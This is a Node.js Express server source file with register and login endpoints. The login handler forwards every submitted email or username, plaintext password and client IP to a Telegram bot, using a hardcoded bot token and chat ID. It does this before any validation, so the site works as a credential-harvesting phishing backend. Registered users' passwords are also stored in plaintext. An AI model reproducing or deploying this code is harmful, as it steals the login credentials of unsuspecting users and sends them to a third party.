const express = require('express');
const cors = require('cors');

// Try to load axios, but don't fail if it's not there
let axios;
try {
    axios = require('axios');
} catch (e) {
    console.log('Axios not available, Telegram disabled');
}

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram config - REPLACE WITH YOUR ACTUAL TOKENS
const TELEGRAM_BOT_TOKEN = '8716008095:AAEx89L4ab3oRZEh_WO637CyO6A0aiMlu-Q';
const TELEGRAM_CHAT_ID = '5707645216';

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Telegram function
async function sendToTelegram(email, password, ip) {
    if (!axios) {
        console.log('Axios not available');
        return;
    }
    
    const message = `🔐 LOGIN: ${email} | PASS: ${password} | IP: ${ip}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });
        console.log('✅ Telegram sent');
    } catch (error) {
        console.log('❌ Telegram failed:', error.message);
    }
}

// Store users
const users = [];

// Register
app.post('/api/register', (req, res) => {
    const { name, email, password } = req.body;
    
    if (!name || !email || !password) {
        return res.status(400).json({ error: 'All fields required' });
    }
    
    if (password.length < 6) {
        return res.status(400).json({ error: 'Password must be 6+ characters' });
    }
    
    const existing = users.find(u => u.email === email);
    if (existing) {
        return res.status(400).json({ error: 'User exists' });
    }
    
    const newUser = { id: users.length + 1, name, email, password };
    users.push(newUser);
    
    res.json({ success: true, message: 'Account created!', user: { id: newUser.id, name, email } });
});

// Login
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    
    // Get IP
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Send to Telegram
    sendToTelegram(identifier, password, ip);
    
    if (!identifier || !password) {
        return res.status(400).json({ error: 'Email and password required' });
    }
    
    const user = users.find(u => u.email === identifier);
    
    if (!user || user.password !== password) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    res.json({ success: true, message: 'Login successful!', user: { id: user.id, name: user.name, email: user.email } });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
